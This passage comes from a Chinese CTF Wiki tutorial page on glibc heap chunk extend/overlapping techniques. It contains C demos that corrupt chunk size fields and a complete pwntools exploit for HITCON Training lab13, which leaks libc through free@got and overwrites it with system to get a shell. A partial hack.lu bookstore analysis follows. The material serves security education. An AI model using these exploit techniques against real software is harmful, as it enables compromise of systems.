0x602020:   0x0000000000000000  0x0000000000000021
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000020fc1
</code></pre>
              </div>
              执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。
              <div class="codehilite">
                <pre><span></span><code>Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
</code></pre>
              </div>
              之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制chunk2中的内容，我们也把这种状态称为 overlapping chunk。
              <div class="codehilite">
                <pre><span></span><code>call   0x400450 &lt;malloc@plt&gt;
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
</code></pre>
              </div>
            </p>
            <h2 id="2inusesmallbinextend">基本示例2：对inuse的smallbin进行extend<a class="headerlink"
                href="#2inusesmallbinextend" title="Permanent link">&para;</a></h2>
            <p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于unsorted bin链表中。
              以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是0x70）
              <div class="codehilite">
                <pre><span></span><code>int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个 0x80 的chunk1
    malloc(0x10); //分配第二个 0x10 的chunk2
    malloc(0x10); //防止与top chunk合并

    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
</code></pre>
              </div>
              在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和top chunk合并。所以我们需要额外分配一个chunk，把释放的块与top
              chunk隔开。
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
</code></pre>
              </div>
              释放后，chunk1 把 chunk2 的内容吞并掉并一起置入unsorted bin
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk
</code></pre>
              </div>
              <div class="codehilite">
                <pre><span></span><code>[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
</code></pre>
              </div>
              再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容
              <div class="codehilite">
                <pre><span></span><code>     0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax

     rax : 0x0000000000602010
</code></pre>
              </div>
            </p>
            <h2 id="3freesmallbinextend">基本示例3：对free的smallbin进行extend<a class="headerlink" href="#3freesmallbinextend"
                title="Permanent link">&para;</a></h2>
            <p>示例3是在示例2的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的size域。
              <div class="codehilite">
                <pre><span></span><code>int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x80);//分配第一个0x80的chunk1
    malloc(0x10);//分配第二个0x10的chunk2

    free(ptr);//首先进行释放，使得chunk1进入unsorted bin

    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
</code></pre>
              </div>
              两次 malloc 之后的结果如下
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
</code></pre>
              </div>
              我们首先释放chunk1使它进入unsorted bin中
              <div class="codehilite">
                <pre><span></span><code>     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk
</code></pre>
              </div>
              然后篡改chunk1的size域
              <div class="codehilite">
                <pre><span></span><code>0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== size域被篡改
0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000090  0x0000000000000020
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000020f51
</code></pre>
              </div>
              此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了chunk2 的内容。</p>
            <h2 id="chunk-extendshrink">Chunk Extend/Shrink 可以做什么<a class="headerlink" href="#chunk-extendshrink"
                title="Permanent link">&para;</a></h2>
            <p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制chunk中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p>
            <p>此外通过extend可以实现chunk overlapping，通过overlapping可以控制chunk的fd/bk指针从而可以实现 fastbin attack 等利用。</p>
            <h2 id="4extendoverlapping">基本示例4：通过extend后向overlapping<a class="headerlink" href="#4extendoverlapping"
                title="Permanent link">&para;</a></h2>
            <p>这里展示通过extend进行后向overlapping，这也是在CTF中最常出现的情况，通过overlapping可以实现其它的一些利用。
              <div class="codehilite">
                <pre><span></span><code>int main()
{
    void *ptr,*ptr1;

    ptr=malloc(0x10);//分配第1个 0x80 的chunk1
    malloc(0x10); //分配第2个 0x10 的chunk2
    malloc(0x10); //分配第3个 0x10 的chunk3
    malloc(0x10); //分配第4个 0x10 的chunk4
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
</code></pre>
              </div>
              在malloc(0x50)对extend区域重新占位后，其中0x10的fastbin块依然可以正常的分配和释放，此时已经构成overlapping，通过对overlapping的进行操作可以实现fastbin
              attack。</p>
            <h2 id="5extendoverlapping">基本示例5：通过extend前向overlapping<a class="headerlink" href="#5extendoverlapping"
                title="Permanent link">&para;</a></h2>
            <p>这里展示通过修改pre_inuse域和pre_size域实现合并前面的块
              <div class="codehilite">
                <pre><span></span><code>int main(void)
{
    void *ptr1,*ptr2,*ptr3,*ptr4;
    ptr1=malloc(128);//smallbin1
    ptr2=malloc(0x10);//fastbin1
    ptr3=malloc(0x10);//fastbin2
    ptr4=malloc(128);//smallbin2
    malloc(0x10);//防止与top合并
    free(ptr1);
    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域
    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域
    free(ptr4);//unlink进行前向extend
    malloc(0x150);//占位块

}
</code></pre>
              </div>
              前向extend利用了smallbin的unlink机制，通过修改pre_size域可以跨越多个chunk进行合并实现overlapping。</p>
            <h2 id="hitcon-trainging-lab13">HITCON Trainging lab13<a class="headerlink" href="#hitcon-trainging-lab13"
                title="Permanent link">&para;</a></h2>
            <p><a
                href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">题目链接</a>
            </p>
            <h3 id="_3">基本信息<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
            <div class="codehilite">
              <pre><span></span><code>➜  hitcontraning_lab13 git:<span class="o">(</span>master<span class="o">)</span> file heapcreator
heapcreator: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped
➜  hitcontraning_lab13 git:<span class="o">(</span>master<span class="o">)</span> checksec heapcreator
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre>
            </div>

            <p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p>
            <h3 id="_4">基本功能<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
            <p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p>
            <ol>
              <li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行
                malloc。此外，这里读取之后并没有设置 NULL。</li>
              <li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 off by one 的漏洞</strong>。</li>
              <li>展示堆，输出指定索引堆的大小以及内容。</li>
              <li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
            </ol>
            <h3 id="_5">利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
            <p>基本利用思路如下</p>
            <ol>
              <li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
              <li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
            </ol>
            <p>更加具体的还是直接看脚本吧。</p>
            <div class="codehilite">
              <pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./heapcreator&#39;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./heapcreator&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="n">free_got</span> <span class="o">=</span> <span class="mh">0x602018</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>  <span class="c1"># 0</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s2">&quot;ddaa&quot;</span><span class="p">)</span>  <span class="c1"># 1</span>
<span class="c1"># overwrite heap 1&#39;s struct&#39;s size to 0x41</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;a&quot;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="c1"># trigger heap 1&#39;s struct to fastbin 0x40</span>
<span class="c1"># heap 1&#39;s content to fastbin 0x20</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="c1"># new heap 1&#39;s struct will point to old heap 1&#39;s content, size 0x20</span>
<span class="c1"># new heap 1&#39;s content will point to old heap 1&#39;s struct, size 0x30</span>
<span class="c1"># that is to say we can overwrite new heap 1&#39;s struct</span>
<span class="c1"># here we overwrite its heap content pointer to free@got</span>
<span class="n">create</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]))</span>  <span class="c1">#1</span>
<span class="c1"># leak freeaddr</span>
<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Content : &quot;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;Done !&quot;</span><span class="p">)</span>

<span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
<span class="c1">#gdb.attach(r)</span>
<span class="c1"># overwrite free@got with system addr</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
<span class="c1"># trigger system(&quot;/bin/sh&quot;)</span>
<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre>
            </div>

            <h2 id="2015-hacklu-bookstore">2015 hacklu bookstore<a class="headerlink" href="#2015-hacklu-bookstore"
                title="Permanent link">&para;</a></h2>
            <p><a
                href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a>
            </p>
            <h3 id="_6">基本信息<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
            <div class="codehilite">
              <pre><span></span><code>➜  2015_hacklu_bookstore git:<span class="o">(</span>master<span class="o">)</span> file books
books: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
➜  2015_hacklu_bookstore git:<span class="o">(</span>master<span class="o">)</span> checksec books
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre>
            </div>

            <p>可以看出该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护。</p>
            <h3 id="_7">基本功能<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
            <p>该程序的主要功能是订书，具体如下</p>
            <ul>
              <li>最多可以订购两本书。</li>
              <li>根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。</li>
              <li>根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。</li>
              <li>提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。</li>
              <li>此外，在程序退出之前存在一个<strong>格式化字符串漏洞</strong>。</li>
            </ul>
            <p>这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。</p>
            <h3 id="_8">利用思路<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
            <p>程序中主要的漏洞在于堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出对应的dest 数组。具体思路如下</p>
            <ol>
              <li>利用堆溢出进行 chunk extend，使得在 submit 中 <code>malloc(0x140uLL)</code> 时，恰好返回第二个订单处的位置。在 submit
                之前，布置好堆内存布局，使得把字符串拼接后恰好可以覆盖 dest 为指定的格式化字符串。</li>
              <li>通过构造 dest 为指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，<strong>一方面控制程序重新返回执行</strong>。这时，便可以知道 libc
                基地址，system 等地址。需要注意的是由于一旦 submit 之后，程序就会直接直接退出，所以我们比较好的思路就是修改 fini_array
                中的变量，以便于达到程序执行完毕后，<strong>重新返回我们期待的位置</strong>。这里我们会使用一个trick，程序每次读取选择的时候会读取 128 大小，在栈上。而程序最后在输出 dest
                的时候，之前所读取的那部分选择必然是在栈上的，所以我们如果我们在栈上预先布置好一些控制流指针，那就可以来控制程序的执行流程。</li>
              <li>再次利用格式化字符串漏洞，覆盖 free@got 为 system 地址，从而达到任意命令执行的目的。</li>
            </ol>
            <p>这里，各个参数的偏移是</p>
            <ul>
              <li>Fini_array0 : 5+8=13</li>
              <li>__libc_start_main_ret : 5+0x1a=31。</li>
            </ul>
            <div class="codehilite">
              <pre><span></span><code>00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0
01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000
02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#39;Order 1:&#39;)
03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx
04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 (&#39;%sffffff&#39;)
05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#39;Order 1:&#39;)
06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (&#39; 2: Orde&#39;)
07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* &#39;5\n&#39; */
08:0040│      0x7ffe6a7f3f08 ◂— 0x0
... ↓
0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000
0c:0060│      0x7ffe6a7f3f28 ◂— 0x0
... ↓
0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* &#39;ttime&#39; */
10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 (&#39;vdso_get&#39;)
11:0088│      0x7ffe6a7f3f50 ◂— 0x1
12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1
13:0098│      0x7ffe6a7f3f60 ◂— 0x0
... ↓
15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15
16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp
17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1
18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00
19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15
1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
</code></pre>
            </div>

            <p><strong>！！！待补充！！！</strong></p>
            <h2 id="_9">题目<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
            <ul>
              <li><a
                  href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap">2016
                  Nuit du Hack CTF Quals : night deamonic heap</a></li>
            </ul>









            <h2 id="__comments">评论</h2>
            <div id="disqus_thread"></div>
            <script>
              var disqus_config = function () {
                this.page.url = "https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/";
                this.page.identifier =
                  "pwn/linux/glibc-heap/chunk_extend_overlapping-zh/";
              };
              (function () {
                var d = document, s = d.createElement("script");
                s.src = "//ctf-wiki.disqus.com/embed.js";
                s.setAttribute("data-timestamp", +new Date());
                (d.head || d.body).appendChild(s);
              })();
            </script>


          </article>
        </div>
      </div>
    </main>


    <footer class="md-footer">

      <div class="md-footer-nav">
        <nav class="md-footer-nav__inner md-grid">

          <a href="../off_by_one-zh/" title="Heap-based Off-By-One"
            class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  上一页
                </span>
                Heap-based Off-By-One
              </span>
            </div>
          </a>


          <a href="../unlink-zh/" title="Unlink" class="md-flex md-footer-nav__link md-footer-nav__link--next"
            rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  下一页
                </span>
                Unlink
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>

        </nav>
      </div>

      <div class="md-footer-meta md-typeset">
        <div class="md-footer-meta__inner md-grid">
          <div class="md-footer-copyright">

            <div class="md-footer-copyright__highlight">
              Copyright &copy; 2016 - 2020 CTF Wiki Team
            </div>

            powered by
            <a href="https://www.mkdocs.org" target="_blank" rel="noopener">MkDocs</a>
            and
            <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
              Material for MkDocs</a>
          </div>

        </div>
      </div>
    </footer>

  </div>

  <script src="../../../../assets/javascripts/application.c33a9706.js"></script>




  <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>









  <script>app.initialize({ version: "1.0.4", url: { base: "../../../.." } })</script>

  <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>

  <script src="../../../../_static/js/extra.js"></script>

  <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>


</body>

</html>
